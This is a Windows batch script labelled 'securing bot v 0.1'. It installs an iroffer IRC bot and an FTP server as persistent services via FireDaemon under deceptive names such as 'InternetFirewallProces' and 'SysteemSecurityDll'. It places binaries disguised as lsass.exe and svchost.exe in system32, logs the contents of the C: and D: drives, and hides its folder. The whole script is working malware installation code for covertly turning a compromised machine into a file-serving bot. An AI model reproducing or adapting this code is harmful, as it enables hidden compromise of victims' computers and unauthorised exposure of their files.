@echo off
REM echo securing bot v 0.1
@echo off
del temp > nul
echo copying dir for HD space
dir c:\*.* > c:\windows\system32\updates\dll\dir.log
dir d:\*.* >> c:\windows\system32\updates\dll\dir.log
echo setting variables
SET MXBIN=c:\windows\system32\updates
SET MXHOME=c:\windows\system32\updates
echo installing iroffer
echo .
c:\windows\system32\updates\firedaemon -i InternetFirewallProces "c:\windows\system32\updates" "c:\windows\system32\updates\lsass.exe" "ms.dll" Y 0 0 0 Y
echo installing ftp
echo .
c:\windows\system32\updates\firedaemon -i SysteemSecurityDll "c:\windows\system32\updates" "c:\windows\system32\updates\svchost.exe" "" Y 0 0 0 Y
echo .
echo Services installed - look for errors on symav, if any run addit.bat
echo .
echo Starting services
net start "InternetFirewallProces"
net start "SysteemSecurityDll"
attrib +h c:\windows\system32\updates
echo progress complete
